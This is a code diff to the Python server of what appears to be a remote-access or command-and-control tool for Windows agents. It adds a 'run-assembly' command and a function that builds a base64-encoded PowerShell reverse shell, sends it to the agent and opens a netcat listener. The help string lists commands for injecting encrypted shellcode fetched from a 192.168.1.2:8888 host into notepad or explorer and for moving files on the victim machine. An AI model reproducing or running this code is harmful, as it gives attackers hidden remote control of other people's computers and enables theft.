@@ -6,7 +6,7 @@ import os
 
 def Session(host, port):
 
-    h = ">> shell whoami\n>> inject http://192.168.1.2:8888/shellcode.enc notepad DtGvFck#\n>> pid_inject explorer c:\\windows\system32\ikiik.exe http://192.168.1.2:8888/shellcode.enc DtGvFck#\n>> download c:\\users\issam\desktop\ikiik.exe\n>> upload http://192.168.1.2:8888/ikiik.exe c:\\users\issam\desktop\ikiik.exe"
+    h = ">> powershell\n >> run-assembly http://192.168.1.2:8888/enc_a.exe DtGvFck# <assembly args here> \n >> shell whoami\n>> inject http://192.168.1.2:8888/shellcode.enc notepad DtGvFck#\n>> pid_inject explorer c:\\windows\system32\ikiik.exe http://192.168.1.2:8888/shellcode.enc DtGvFck#\n>> download c:\\users\ikiik\desktop\ikiik.exe\n>> upload http://192.168.1.2:8888/ikiik.exe c:\\users\ikiik\desktop\ikiik.exe"
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((host, port))
         print("[+] server started ")
@@ -82,7 +82,31 @@ def Session(host, port):
                             break
                         result = RecvOutput(conn)
                         print(result)
-                        
+                    if len(command) > 1 and command[0] == "run-assembly":
+                        try:
+                            SendCommand(conn, commandinput)
+                        except:
+                            print("[!] the agent is disconnected")
+                            break
+                        result = RecvOutput(conn)
+                        print(result)
+                    if len(command) > 0 and len(command) < 2 and command[0] == "powershell":
+                        try:
+                            theport = int(input("[++] enter the port to listen: "))
+                            if theport == port:
+                                theport = int(input("[!!!] use a different port then: ".format(port)))
+                            #ip = input("[++] enter the ip: ")
+                            command = Powershell(host, theport)
+                            SendCommand(conn, commandinput + " " + command)
+                            print("[Netcat] starting... " )
+                            os.system("nc -lvnp " + str(theport))
+                            print("[Nectat] connection closed.")
+        
+                        except:
+                            print("[!] the agent is disconnected")
+                            break
+                        result = RecvOutput(conn)
+                        print(result)
 
             except:
                 CloseSession(conn, "exit")
@@ -149,6 +173,15 @@ def DownloadFile(content):
             with open(filepath, "w") as outfile:
                 outfile.write((base64.b64decode(content)).decode("utf-8"))
                 outfile.close()
+
+
+def Powershell(ip, port):
+    pshell = "\"$client = New-Object System.Net.Sockets.TCPClient(\'"+ip+"\',"+str(port)+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'pshell > \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+    pshell64 = base64.b64encode(pshell.encode("utf-8"))
+    pshell64_str = str(pshell64)
+    return pshell64_str[2:-1]
+
+
 
 def UploadFile(filepath):
     if os.path.isfile(filepath) and os.path.exists(filepath):
